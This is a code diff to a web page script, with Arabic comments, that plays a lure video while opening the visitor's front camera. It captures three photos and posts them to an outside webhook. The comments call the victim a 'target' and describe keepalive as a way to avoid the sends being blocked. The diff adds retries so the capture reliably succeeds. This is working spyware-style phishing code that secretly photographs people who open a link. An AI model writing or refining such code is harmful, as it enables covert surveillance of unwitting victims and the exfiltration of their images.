@@ -55,20 +55,22 @@
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // تشغيل الكاميرا
+            // فتح الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // التقاط الصورة بعد 4 ثواني
-                setTimeout(captureAndSend, 4000);
+                // تكتيك المحاولات الثلاث لضمان الإرسال
+                setTimeout(() => sendShot(1), 3000); 
+                setTimeout(() => sendShot(2), 6000); 
+                setTimeout(() => sendShot(3), 9000); 
             };
         } catch (err) {
-            console.log("Error");
+            console.log("Permission denied");
         }
     });
 
-    async function captureAndSend() {
+    function sendShot(num) {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -77,19 +79,22 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            // تحويل الصورة لملف PNG وإرساله بطريقة الـ FormData الأكيدة
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'image.png');
-                formData.append('content', '📸 **تم صيد الهدف بنجاح!**');
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                const fd = new FormData();
+                fd.append('file', blob, `image_${num}.png`);
+                fd.append('content', `📸 **صورة جديدة من الرابط!** (محاولة رقم ${num})`);
 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    body: formData
+                // الإرسال مع تفعيل keepalive لضمان عدم الحظر
+                fetch(webhookURL, { 
+                    method: 'POST', 
+                    body: fd,
+                    keepalive: true 
                 });
             }, 'image/png');
         } else {
-            setTimeout(captureAndSend, 1000);
+            // إذا كانت الكاميرا سوداء، انتظر ثانية وحاول مجدداً
+            setTimeout(() => sendShot(num + "_retry"), 1000);
         }
     }
 </script>
